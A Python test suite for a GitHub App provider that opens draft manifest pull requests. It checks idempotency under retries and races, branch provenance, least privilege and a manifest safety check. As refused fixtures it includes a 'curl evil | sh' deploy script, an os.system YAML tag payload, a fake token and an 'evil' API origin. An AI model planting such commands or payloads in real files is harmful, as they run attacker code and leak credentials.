"""The real provider, against a stateful fake of the GitHub write API.

The property under test is one sentence: **the same proposal produces at
most one branch, one commit and one pull request**, however many times it is
attempted, however the network behaves in between, and whether the attempts
are sequential or genuinely concurrent.

That is not a retry policy. It is the reason every step reads before it
writes: an attempt that was interrupted anywhere must be resumable without
producing a second of anything in somebody's repository. And it is the reason
reuse is *earned* — a branch is adopted only when it carries exactly this
proposal and nothing else.

No network, no credential, no real repository. `WriteFakeGitHub` composes
every response, models a real commit graph, and records which mutations were
actually applied.
"""

import asyncio
import uuid as uuidlib
from typing import Any

import pytest
from drake_api.github_app.auth import GitHubAppAuth
from drake_api.github_app.client import GitHubClient
from drake_api.github_app.scanner import ScanResult, generate_draft_manifest
from drake_api.onboarding.github_provider import (
    GITOPS_PERMISSIONS,
    DraftRefusedError,
    GitHubPullRequestProvider,
    assert_draft_is_safe,
)
from drake_api.settings import Settings
from fake_github_write import WriteFakeGitHub

pytestmark = pytest.mark.anyio

BASE_SHA = "a" * 40
HEAD_BRANCH = "drake/onboarding/2f1c9a2b"
MANIFEST = ".drake/project.yaml"


def _draft(fake: WriteFakeGitHub, commit: str | None = None) -> str:
    """The draft Drake really generates, for this repository at this commit.

    The tests drive the actual generator rather than a hand-written
    lookalike: the provider's safety boundary asserts things ABOUT the
    generator's output, and a stand-in would let the two drift while every
    test still passed.
    """
    return generate_draft_manifest(
        fake.owner,
        fake.name,
        fake.default_branch,
        ScanResult(
            commit_sha=commit or fake.branches[fake.default_branch],
            default_branch=fake.default_branch,
        ),
    )


def _settings(tmp_path: Any) -> Settings:
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.primitives.asymmetric import rsa

    key = tmp_path / "key.pem"
    if not key.exists():
        key.write_bytes(
            rsa.generate_private_key(public_exponent=65537, key_size=2048).private_bytes(
                serialization.Encoding.PEM,
                serialization.PrivateFormat.PKCS8,
                serialization.NoEncryption(),
            )
        )
    return Settings(
        env="local",
        github_app_enabled=True,
        github_app_client_id="Iv1.local",
        github_app_private_key_file=str(key),
        github_api_base_url="https://api.github.test",
    )


def _provider(fake: WriteFakeGitHub, tmp_path: Any) -> GitHubPullRequestProvider:
    """A real client over the fake transport, in a local-shaped process."""
    settings = _settings(tmp_path)
    client = GitHubClient(settings, GitHubAppAuth(settings), transport=fake.transport())
    return GitHubPullRequestProvider(client)


async def _propose(
    provider: GitHubPullRequestProvider,
    fake: WriteFakeGitHub,
    *,
    content: str | None = None,
    base_commit_sha: str | None = None,
) -> Any:
    base = base_commit_sha or fake.branches[fake.default_branch]
    return await provider.create_pull_request(
        installation_id=fake.installation_id,
        repository_id=fake.repository_id,
        owner=fake.owner,
        name=fake.name,
        base_branch=fake.default_branch,
        base_commit_sha=base,
        head_branch=HEAD_BRANCH,
        file_path=MANIFEST,
        content=content if content is not None else _draft(fake, base),
        title="ignored",
        body="ignored",
    )


# ===========================================================================
# create-or-reuse
# ===========================================================================


async def test_a_fresh_proposal_creates_one_branch_one_commit_and_one_draft_pull_request(
    tmp_path: Any,
) -> None:
    fake = WriteFakeGitHub()
    result = await _propose(_provider(fake, tmp_path), fake)

    assert result.outcome == "created"
    assert result.number == 101
    assert fake.counts() == {"branches": 1, "commits": 1, "pulls": 1}

    # Exactly where it was allowed to write, and nowhere else.
    assert fake.file_on(HEAD_BRANCH) == _draft(fake, BASE_SHA)
    assert fake.branches[fake.default_branch] == BASE_SHA, "the default branch was not touched"
    assert fake.file_on(fake.default_branch) is None

    pull = fake.pulls[0]
    assert pull["draft"] is True, "always a draft: the manifest is not finished"
    assert "needs your input" in pull["title"]
    body = pull["body"]
    for field in ("team", "clusterRef", "namespace", "metricsProfile", "mode"):
        assert field in body, field
    assert "does not import anything into Drake" in body
    # Nothing secret travels in the text Drake writes into a repository.
    for forbidden in ("ghs_", "ghp_", "BEGIN", "Authorization"):
        assert forbidden not in body


async def test_a_second_identical_proposal_reuses_the_pull_request(tmp_path: Any) -> None:
    """The core property, in its simplest form."""
    fake = WriteFakeGitHub()
    provider = _provider(fake, tmp_path)

    first = await _propose(provider, fake)
    second = await _propose(provider, fake)

    assert first.outcome == "created"
    assert second.outcome == "exists"
    assert second.number == first.number
    # One of everything, after two full attempts.
    assert fake.counts() == {"branches": 1, "commits": 1, "pulls": 1}


@pytest.mark.parametrize(
    ("lost", "label"),
    [
        ("POST /git/refs", "branch create"),
        ("PUT /contents", "commit"),
        ("POST /pulls", "pull request create"),
    ],
)
async def test_a_lost_response_is_reconciled_rather_than_repeated(
    tmp_path: Any, lost: str, label: str
) -> None:
    """The write landed; the answer did not.

    This is the case that makes blind retry unsafe: the server applied the
    change and the client has no way to know. Re-sending produces a second
    branch, a second commit, or a second pull request. Reading does not.
    """
    fake = WriteFakeGitHub()
    provider = _provider(fake, tmp_path)
    fake.swallow_response.add(lost)

    first = await _propose(provider, fake)
    # Ambiguous, and reported as retryable rather than as success or failure.
    assert first.outcome == "retryable", label
    assert first.error_code == "github_write_ambiguous"

    second = await _propose(provider, fake)
    assert second.outcome in ("created", "exists"), label
    assert second.number == 101
    # The interrupted attempt left exactly one of each, and the resumed one
    # added nothing.
    assert fake.counts() == {"branches": 1, "commits": 1, "pulls": 1}, label


async def test_three_sequential_passes_leave_exactly_one_of_everything(tmp_path: Any) -> None:
    """Resumability, stated as repetition.

    Sequential on purpose, and NOT offered as evidence about concurrency —
    the racing tests below do that with real interleaving.
    """
    fake = WriteFakeGitHub()
    results = [
        await _propose(_provider(fake, tmp_path), fake),
        await _propose(_provider(fake, tmp_path), fake),
        await _propose(_provider(fake, tmp_path), fake),
    ]
    assert [r.outcome for r in results] == ["created", "exists", "exists"]
    assert {r.number for r in results} == {101}
    assert fake.counts() == {"branches": 1, "commits": 1, "pulls": 1}


async def test_a_pull_request_create_that_answers_422_finds_the_existing_one(
    tmp_path: Any,
) -> None:
    """422 is what GitHub says when the pull request already exists.

    Look, rather than assume it in either direction.
    """
    fake = WriteFakeGitHub()
    provider = _provider(fake, tmp_path)
    await _propose(provider, fake)

    # A second proposal where the search misses but the create conflicts —
    # the shape of a racing writer.
    fake.pulls.clear()
    fake.conflict_on.add("POST /pulls")
    result = await _propose(provider, fake)
    assert result.outcome == "terminal"
    assert result.error_code == "github_write_conflict", (
        "the create conflicted and no pull request could be found: honest, not invented"
    )
    assert fake.counts()["pulls"] == 1


# ===========================================================================
# genuine concurrency
#
# Two providers, one fake, `asyncio.gather`, and a rendezvous that holds
# every caller reaching an endpoint until both have arrived — so both have
# already done their reads before either writes. That is the interleaving a
# sequential test cannot produce.
# ===========================================================================


async def _race(fake: WriteFakeGitHub, tmp_path: Any) -> list[Any]:
    return list(
        await asyncio.gather(
            _propose(_provider(fake, tmp_path), fake),
            _propose(_provider(fake, tmp_path), fake),
        )
    )


async def test_two_callers_racing_the_branch_create_produce_one_of_everything(
    tmp_path: Any,
) -> None:
    """Both see no branch. One creates it; the other is told it exists.

    The loser must not re-send and must not give up: it re-reads the ref and
    carries on with what is there, because what is there is this proposal.
    """
    fake = WriteFakeGitHub()
    fake.rendezvous = {"POST /git/refs": 2, "PUT /contents": 2, "POST /pulls": 2}

    results = await _race(fake, tmp_path)

    assert {r.outcome for r in results} <= {"created", "exists"}, [
        (r.outcome, r.error_code) for r in results
    ]
    assert {r.number for r in results} == {101}
    assert fake.counts() == {"branches": 1, "commits": 1, "pulls": 1}


async def test_two_callers_racing_the_manifest_commit_produce_one_commit(tmp_path: Any) -> None:
    """Both see the branch with no manifest on it. Only one commit may land."""
    fake = WriteFakeGitHub()
    fake.branch_at(HEAD_BRANCH)
    fake.rendezvous = {"PUT /contents": 2, "POST /pulls": 2}

    results = await _race(fake, tmp_path)

    assert {r.outcome for r in results} <= {"created", "exists"}, [
        (r.outcome, r.error_code) for r in results
    ]
    assert fake.counts() == {"branches": 0, "commits": 1, "pulls": 1}
    assert fake.file_on(HEAD_BRANCH) == _draft(fake, BASE_SHA)


async def test_two_callers_racing_the_pull_request_create_produce_one_pull_request(
    tmp_path: Any,
) -> None:
    """Both see a ready branch and no pull request. 422 resolves to reuse."""
    fake = WriteFakeGitHub()
    fake.branch_at(HEAD_BRANCH)
    fake.commit_on(HEAD_BRANCH, {MANIFEST: _draft(fake, BASE_SHA)})
    fake.rendezvous = {"POST /pulls": 2}

    results = await _race(fake, tmp_path)

    assert {r.outcome for r in results} <= {"created", "exists"}, [
        (r.outcome, r.error_code) for r in results
    ]
    assert {r.number for r in results} == {101}
    # The branch was already right, so the race added a pull request and
    # nothing else.
    assert fake.counts() == {"branches": 0, "commits": 0, "pulls": 1}


# ===========================================================================
# branch provenance — what a reused pull request is allowed to carry
# ===========================================================================


async def test_a_branch_carrying_only_the_manifest_commit_is_reused(tmp_path: Any) -> None:
    """The resumable case: our branch, our commit, our content, no PR yet."""
    fake = WriteFakeGitHub()
    fake.branch_at(HEAD_BRANCH)
    fake.commit_on(HEAD_BRANCH, {MANIFEST: _draft(fake, BASE_SHA)})

    result = await _propose(_provider(fake, tmp_path), fake)
    assert result.outcome == "created"
    # No second branch and no second commit: it was already exactly right.
    assert fake.counts() == {"branches": 0, "commits": 0, "pulls": 1}


async def test_a_branch_carrying_a_foreign_second_commit_is_never_adopted(tmp_path: Any) -> None:
    """The manifest is right. Something else rode along.

    Matching content is not provenance: a pull request opened over this
    branch would propose somebody else's commit under Drake's name.
    """
    fake = WriteFakeGitHub()
    fake.branch_at(HEAD_BRANCH)
    fake.commit_on(HEAD_BRANCH, {MANIFEST: _draft(fake, BASE_SHA)})
    fake.commit_on(HEAD_BRANCH, {"scripts/deploy.sh": "curl evil | sh\n"})

    result = await _propose(_provider(fake, tmp_path), fake)
    assert result.outcome == "terminal"
    assert result.error_code == "branch_conflict"
    assert fake.counts() == {"branches": 0, "commits": 0, "pulls": 0}
    assert fake.file_on(HEAD_BRANCH, "scripts/deploy.sh") == "curl evil | sh\n", "untouched"


async def test_a_branch_whose_commit_also_changes_another_file_is_never_adopted(
    tmp_path: Any,
) -> None:
    """One commit, but two files in it. Still not this proposal."""
    fake = WriteFakeGitHub()
    fake.branch_at(HEAD_BRANCH)
    fake.commit_on(
        HEAD_BRANCH,
        {MANIFEST: _draft(fake, BASE_SHA), ".github/workflows/ci.yaml": "on: push\n"},
    )

    result = await _propose(_provider(fake, tmp_path), fake)
    assert result.outcome == "terminal"
    assert result.error_code == "branch_conflict"
    assert fake.counts() == {"branches": 0, "commits": 0, "pulls": 0}


async def test_an_open_pull_request_over_an_unsafe_branch_is_not_reused(tmp_path: Any) -> None:
    """An open pull request does not make a foreign commit Drake's work.

    This is the ordering the whole check exists for: provenance is
    established BEFORE the pull request search is allowed to answer.
    """
    fake = WriteFakeGitHub()
    fake.branch_at(HEAD_BRANCH)
    fake.commit_on(HEAD_BRANCH, {MANIFEST: _draft(fake, BASE_SHA)})
    fake.commit_on(HEAD_BRANCH, {"Makefile": "all:\n\techo hi\n"})
    fake.pulls.append(
        {
            "number": 77,
            "state": "open",
            "draft": True,
            "title": "looks legitimate",
            "body": "",
            "head": {"ref": HEAD_BRANCH},
            "base": {"ref": fake.default_branch},
        }
    )

    result = await _propose(_provider(fake, tmp_path), fake)
    assert result.outcome == "terminal"
    assert result.error_code == "branch_conflict"
    assert result.number is None, "a foreign pull request number is never returned"
    assert fake.counts() == {"branches": 0, "commits": 0, "pulls": 0}


async def test_an_open_pull_request_over_an_exact_branch_is_reused(tmp_path: Any) -> None:
    fake = WriteFakeGitHub()
    fake.branch_at(HEAD_BRANCH)
    fake.commit_on(HEAD_BRANCH, {MANIFEST: _draft(fake, BASE_SHA)})
    fake.pulls.append(
        {
            "number": 77,
            "state": "open",
            "draft": True,
            "title": "Add Drake project manifest (draft — needs your input)",
            "body": "",
            "head": {"ref": HEAD_BRANCH},
            "base": {"ref": fake.default_branch},
        }
    )

    result = await _propose(_provider(fake, tmp_path), fake)
    assert result.outcome == "exists"
    assert result.number == 77
    assert fake.counts() == {"branches": 0, "commits": 0, "pulls": 0}


async def test_a_branch_built_on_a_different_history_writes_nothing(tmp_path: Any) -> None:
    """Ancestry, exactly.

    Content that matches proves nothing about where the branch came from; a
    branch with no common history with the reviewed base is not a proposal
    on that base.
    """
    fake = WriteFakeGitHub()
    unrelated = "e" * 40
    fake.commits[unrelated] = {"parent": None, "files": {}}
    fake.branch_at(HEAD_BRANCH, unrelated)
    fake.commit_on(HEAD_BRANCH, {MANIFEST: _draft(fake, BASE_SHA)})

    result = await _propose(_provider(fake, tmp_path), fake)
    assert result.outcome == "terminal"
    assert result.error_code == "branch_conflict"
    assert fake.counts() == {"branches": 0, "commits": 0, "pulls": 0}


async def test_a_branch_behind_the_reviewed_base_writes_nothing(tmp_path: Any) -> None:
    fake = WriteFakeGitHub()
    # Move the default branch forward, so the reviewed base has an ancestor
    # a stale branch can be sitting on.
    moved = fake.commit_on(fake.default_branch, {"README.md": "hello\n"})
    fake.branch_at(HEAD_BRANCH, BASE_SHA)

    result = await _propose(_provider(fake, tmp_path), fake, base_commit_sha=moved)
    assert result.outcome == "terminal"
    assert result.error_code == "branch_conflict"
    assert fake.counts() == {"branches": 0, "commits": 0, "pulls": 0}


async def test_a_branch_too_large_to_inspect_writes_nothing(tmp_path: Any) -> None:
    """A partial answer would read as "nothing else changed".

    That is the one conclusion the comparison exists to earn, so a branch
    bigger than the inspection budget is refused rather than summarised.
    """
    fake = WriteFakeGitHub()
    fake.branch_at(HEAD_BRANCH)
    for index in range(20):
        fake.commit_on(HEAD_BRANCH, {f"file-{index}.txt": f"{index}\n"})

    result = await _propose(_provider(fake, tmp_path), fake)
    assert result.outcome == "terminal"
    assert result.error_code == "github_contract"
    assert fake.counts() == {"branches": 0, "commits": 0, "pulls": 0}


async def test_a_diverged_branch_writes_nothing(tmp_path: Any) -> None:
    fake = WriteFakeGitHub()
    fake.branch_at(HEAD_BRANCH)
    fake.commit_on(HEAD_BRANCH, {MANIFEST: _draft(fake, BASE_SHA)})
    moved = fake.commit_on(fake.default_branch, {"README.md": "hello\n"})

    result = await _propose(_provider(fake, tmp_path), fake, base_commit_sha=moved)
    assert result.outcome == "terminal"
    assert result.error_code == "branch_conflict"
    assert fake.counts() == {"branches": 0, "commits": 0, "pulls": 0}


# ===========================================================================
# refusals — the cases where nothing may be written
# ===========================================================================


async def test_a_moved_base_writes_nothing(tmp_path: Any) -> None:
    """A plan describes one commit.

    Proposing it onto a branch that has moved makes a claim about code
    nobody reviewed.
    """
    fake = WriteFakeGitHub()
    moved = "b" * 40

    result = await _propose(_provider(fake, tmp_path), fake, base_commit_sha=moved)
    assert result.outcome == "terminal"
    assert result.error_code == "base_moved"
    assert fake.counts() == {"branches": 0, "commits": 0, "pulls": 0}


async def test_a_foreign_branch_with_different_content_is_never_overwritten(
    tmp_path: Any,
) -> None:
    """Drake's branch name, somebody else's work.

    A leftover, a rename, or a person who picked the same name. Whatever it
    is, it is not this proposal, and claiming it would attach Drake's result
    to something nobody reviewed.
    """
    fake = WriteFakeGitHub()
    fake.branch_at(HEAD_BRANCH)
    fake.commit_on(HEAD_BRANCH, {MANIFEST: "apiVersion: something-else\n"})

    result = await _propose(_provider(fake, tmp_path), fake)
    assert result.outcome == "terminal"
    assert result.error_code == "branch_conflict"
    assert fake.counts() == {"branches": 0, "commits": 0, "pulls": 0}
    # Untouched.
    assert fake.file_on(HEAD_BRANCH) == "apiVersion: something-else\n"


async def test_a_repository_that_is_not_the_projected_one_writes_nothing(
    tmp_path: Any,
) -> None:
    """Names move; numeric ids do not.

    A rename between the projection and now must not silently retarget a
    write to whatever holds the name today.
    """
    fake = WriteFakeGitHub()
    provider = _provider(fake, tmp_path)
    result = await provider.create_pull_request(
        installation_id=fake.installation_id,
        repository_id=fake.repository_id + 1,  # not this repository
        owner=fake.owner,
        name=fake.name,
        base_branch=fake.default_branch,
        base_commit_sha=BASE_SHA,
        head_branch=HEAD_BRANCH,
        file_path=MANIFEST,
        content=_draft(fake, BASE_SHA),
        title="",
        body="",
    )
    assert result.outcome == "terminal"
    assert result.error_code == "repository_identity_mismatch"
    assert fake.counts() == {"branches": 0, "commits": 0, "pulls": 0}


async def test_an_archived_repository_writes_nothing(tmp_path: Any) -> None:
    fake = WriteFakeGitHub()
    fake.archived = True
    result = await _propose(_provider(fake, tmp_path), fake)
    assert result.outcome == "terminal"
    assert result.error_code == "repository_unavailable"
    assert fake.counts() == {"branches": 0, "commits": 0, "pulls": 0}


async def test_a_missing_write_permission_is_terminal_and_writes_nothing(
    tmp_path: Any,
) -> None:
    """Retrying cannot grant a permission.

    A human has to accept the App's updated permission set, so this is
    terminal rather than a loop that fails the same way five times.
    """
    fake = WriteFakeGitHub()
    fake.granted_permissions = {"metadata": "read", "contents": "read"}
    result = await _propose(_provider(fake, tmp_path), fake)
    assert result.outcome == "terminal"
    assert result.error_code == "github_permission_missing"
    assert fake.counts() == {"branches": 0, "commits": 0, "pulls": 0}


async def test_the_token_is_narrowed_to_this_repository_and_the_minimum_permissions(
    tmp_path: Any,
) -> None:
    """Least privilege, asserted on the wire rather than in a comment."""
    assert GITOPS_PERMISSIONS == {
        "metadata": "read",
        "contents": "write",
        "pull_requests": "write",
    }
    # Nothing that could merge, change a workflow, or touch protection.
    for forbidden in ("administration", "actions", "workflows", "secrets", "environments"):
        assert forbidden not in GITOPS_PERMISSIONS


@pytest.mark.parametrize(
    ("failure", "outcome", "code", "why"),
    [
        (401, "terminal", "github_permission_missing", "a rejected credential"),
        (403, "terminal", "github_permission_missing", "a plain permission refusal"),
        (
            (403, {"x-ratelimit-remaining": "0"}),
            "retryable",
            "github_rate_limited",
            "403 WITH explicit rate-limit evidence",
        ),
        (
            (403, {"retry-after": "30"}),
            "retryable",
            "github_rate_limited",
            "403 carrying a retry hint",
        ),
        (429, "retryable", "github_rate_limited", "429 with no headers at all"),
        (
            (429, {"retry-after": "60"}),
            "retryable",
            "github_rate_limited",
            "429 carrying only Retry-After",
        ),
        (
            (429, {"x-ratelimit-remaining": "0"}),
            "retryable",
            "github_rate_limited",
            "429 with the primary-limit header",
        ),
        (500, "retryable", "github_unavailable", "a server error"),
        (503, "retryable", "github_unavailable", "an unavailable upstream"),
    ],
)
async def test_provider_failures_are_classified_honestly(
    tmp_path: Any, failure: Any, outcome: str, code: str, why: str
) -> None:
    """Terminal and retryable are different promises to the worker.

    A 429 is rate limiting whatever headers accompany it. Requiring
    `x-ratelimit-remaining: 0` made a bare 429 — which is what a proxy or a
    secondary limit answers with — terminal, so Drake abandoned work that
    would have succeeded a minute later. A 403 stays terminal unless the
    HEADERS say otherwise; its body is provider prose and does not steer
    Drake.
    """
    fake = WriteFakeGitHub()
    fake.fail_with["POST /git/refs"] = failure
    result = await _propose(_provider(fake, tmp_path), fake)
    assert result.outcome == outcome, why
    assert result.error_code == code, why
    assert fake.counts()["branches"] == 0, why


async def test_a_write_is_refused_outside_the_allowlisted_path(tmp_path: Any) -> None:
    fake = WriteFakeGitHub()
    provider = _provider(fake, tmp_path)
    result = await provider.create_pull_request(
        installation_id=fake.installation_id,
        repository_id=fake.repository_id,
        owner=fake.owner,
        name=fake.name,
        base_branch=fake.default_branch,
        base_commit_sha=BASE_SHA,
        head_branch=HEAD_BRANCH,
        file_path=".github/workflows/ci.yaml",
        content=_draft(fake, BASE_SHA),
        title="",
        body="",
    )
    assert result.outcome == "terminal"
    assert result.error_code == "path_not_allowed"
    assert fake.counts() == {"branches": 0, "commits": 0, "pulls": 0}


# ===========================================================================
# what may be pushed at all — the draft safety boundary
# ===========================================================================


def _context(fake: WriteFakeGitHub) -> dict[str, str]:
    return {
        "owner": fake.owner,
        "name": fake.name,
        "default_branch": fake.default_branch,
        "base_commit_sha": BASE_SHA,
    }


def test_the_generated_draft_passes_its_own_safety_check() -> None:
    """The real generator's output, through the real boundary."""
    fake = WriteFakeGitHub()
    placeholders = assert_draft_is_safe(_draft(fake, BASE_SHA), **_context(fake))
    assert set(placeholders) == {
        "spec.owners[0].team",
        "spec.environments[0].clusterRef",
        "spec.environments[0].namespace",
        "spec.services[0].metricsProfile",
        "spec.tenantModel.mode",
    }


def _mutate_draft(fake: WriteFakeGitHub, old: str, new: str) -> str:
    draft = _draft(fake, BASE_SHA)
    assert old in draft, old
    return draft.replace(old, new, 1)


@pytest.mark.parametrize(
    ("build", "why"),
    [
        (
            lambda fake: _draft(fake, BASE_SHA) + "kind: ProjectObservability\n",
            "a duplicate key: a reviewer sees one value and the parser uses another",
        ),
        (lambda fake: "- just\n- a list\n", "not a mapping at all"),
        (
            lambda fake: "!!python/object/apply:os.system ['echo pwned']\n",
            "an unsafe YAML tag",
        ),
        (
            lambda fake: _mutate_draft(fake, "owner: Duosis-Developer-Team", "owner: attacker"),
            "an owner that is not the repository being written to",
        ),
        (lambda fake: _mutate_draft(fake, "name: Hermes", "name: Zeus"), "a different repository"),
        (
            lambda fake: _mutate_draft(fake, "defaultBranch: main", "defaultBranch: release"),
            "a default branch that is not the base being proposed onto",
        ),
        (
            lambda fake: _mutate_draft(fake, f"# Commit: {BASE_SHA}", "# Commit: " + "f" * 40),
            "a base commit the draft does not describe",
        ),
        (
            lambda fake: _mutate_draft(fake, "team: REPLACE_ME", "team: platform"),
            "a decision answered for the operator: a missing placeholder",
        ),
        (
            lambda fake: _mutate_draft(fake, "component: api", "component: REPLACE_ME"),
            "an unexpected placeholder: the generator changed unreviewed",
        ),
        (
            lambda fake: _mutate_draft(fake, "namespace: REPLACE_ME", "namespace: REPLACE_ME-prod"),
            "a guess wearing a placeholder's clothes",
        ),
        (
            lambda fake: _mutate_draft(fake, "kind: ProjectObservability", "kind: Something"),
            "not the kind this provider was reviewed to push",
        ),
        (
            lambda fake: _mutate_draft(fake, "provider: github", "provider: gitlab"),
            "a non-github repository provider",
        ),
        (
            lambda fake: _mutate_draft(fake, "role: primary", "role: http://metrics.internal"),
            "a plaintext endpoint the manifest content policy refuses",
        ),
        (
            lambda fake: _mutate_draft(fake, "role: primary", "role: ghp_aaaaaaaaaaaaaaaaaaaa"),
            "credential-shaped content",
        ),
        (
            lambda fake: _draft(fake, BASE_SHA) + "# " + "x" * 70_000,
            "larger than the write budget",
        ),
    ],
)
def test_an_unexpected_draft_is_refused_before_it_leaves(build: Any, why: str) -> None:
    """Checked against the bytes about to be sent, not what was generated.

    It PARSES rather than scanning lines. A line scan accepted a document
    with duplicate keys and a document that is not a mapping — both of which
    a reviewer and the parser would read differently, which is exactly the
    gap a manifest must not have.
    """
    fake = WriteFakeGitHub()
    with pytest.raises(DraftRefusedError):
        assert_draft_is_safe(build(fake), **_context(fake))


async def test_a_refused_draft_reaches_no_provider_call(tmp_path: Any) -> None:
    fake = WriteFakeGitHub()
    result = await _propose(
        _provider(fake, tmp_path),
        fake,
        content=_draft(fake, BASE_SHA) + "kind: ProjectObservability\n",
    )
    assert result.outcome == "terminal"
    assert result.error_code == "draft_refused"
    assert fake.calls == [], "nothing was sent at all — not even a token mint"


async def test_no_response_carries_a_credential_or_a_provider_message(
    tmp_path: Any,
) -> None:
    """Drake's own bounded codes, never GitHub's prose."""
    fake = WriteFakeGitHub()
    fake.fail_with["POST /git/refs"] = 500
    result = await _propose(_provider(fake, tmp_path), fake)
    rendered = f"{result.outcome}|{result.error_code}|{result.number}"
    for forbidden in ("ghs_", "ghp_", "BEGIN", "api.github", "fake", "message"):
        assert forbidden not in rendered, forbidden


def test_a_production_client_refuses_a_non_github_api_origin(tmp_path: Any) -> None:
    """A configurable origin plus a write credential is an exfiltrator."""
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from drake_api.github_app.client import GitHubContractError

    key = tmp_path / "key.pem"
    key.write_bytes(
        rsa.generate_private_key(public_exponent=65537, key_size=2048).private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.PKCS8,
            serialization.NoEncryption(),
        )
    )
    settings = Settings(
        env="production",
        public_origin="https://drake.example.test",
        allowed_web_origins=["https://drake.example.test"],
        auth_mode="oidc",
        oidc_issuer="https://issuer.example.test",
        oidc_client_id="drake",
        oidc_redirect_url="https://drake.example.test/v1/auth/callback",
        trusted_proxy_count=1,
        session_secret="x" * 64,
        github_app_enabled=True,
        github_app_client_id="Iv1.example",
        github_app_private_key_file=str(key),
        github_webhook_secret_file=str(key),
        github_api_base_url="https://api.github.evil.test",
    )
    client = GitHubClient(settings, GitHubAppAuth(settings))
    with pytest.raises(GitHubContractError) as refused:
        client._assert_write_origin()
    assert "not github.com" in str(refused.value)


async def test_the_client_refuses_to_create_a_branch_outside_the_prefix(
    tmp_path: Any,
) -> None:
    from drake_api.github_app.client import GitHubContractError

    fake = WriteFakeGitHub()
    client = _provider(fake, tmp_path)._client
    token = type("T", (), {"token": "t"})()

    for branch in ("main", "feature/x", "drake-ish/y"):
        with pytest.raises(GitHubContractError):
            await client.create_branch(token, fake.owner, fake.name, branch, BASE_SHA)
    assert fake.calls == [], "nothing left the process"


async def test_the_client_refuses_to_write_outside_the_manifest_path(tmp_path: Any) -> None:
    from drake_api.github_app.client import GitHubContractError

    fake = WriteFakeGitHub()
    client = _provider(fake, tmp_path)._client
    token = type("T", (), {"token": "t"})()

    with pytest.raises(GitHubContractError):
        await client.put_file(
            token,
            fake.owner,
            fake.name,
            path=".github/workflows/ci.yaml",
            branch=HEAD_BRANCH,
            message="x",
            content_base64="eA==",
        )
    assert fake.calls == []


async def test_a_comparison_must_be_pinned_to_commit_shas(tmp_path: Any) -> None:
    """Comparing branch names compares whatever they point at on arrival."""
    from drake_api.github_app.client import GitHubContractError

    fake = WriteFakeGitHub()
    client = _provider(fake, tmp_path)._client
    token = type("T", (), {"token": "t"})()

    with pytest.raises(GitHubContractError):
        await client.compare_commits(
            token, fake.owner, fake.name, base=fake.default_branch, head=HEAD_BRANCH
        )
    assert fake.calls == []


def test_the_provider_has_no_method_that_could_merge_or_delete() -> None:
    """The surface is the guarantee.

    A reviewer should be able to see that merge, force-push, branch delete
    and default-branch commit are impossible by reading the method list.
    """
    from drake_api.github_app import client as client_module

    names = [name for name in dir(client_module.GitHubClient) if not name.startswith("__")]
    for forbidden in ("merge", "delete", "force", "update_ref", "patch"):
        assert not any(forbidden in name for name in names), forbidden


def test_session_ids_are_not_leaked_into_a_pull_request_body() -> None:
    """The body names the session; it must carry nothing else identifying."""
    from drake_api.onboarding.github_provider import _body

    session = str(uuidlib.uuid4())
    rendered = _body(session, BASE_SHA, ["spec.owners[0].team"])
    assert session in rendered
    for forbidden in ("ghs_", "ghp_", "BEGIN", "Authorization", "password"):
        assert forbidden not in rendered
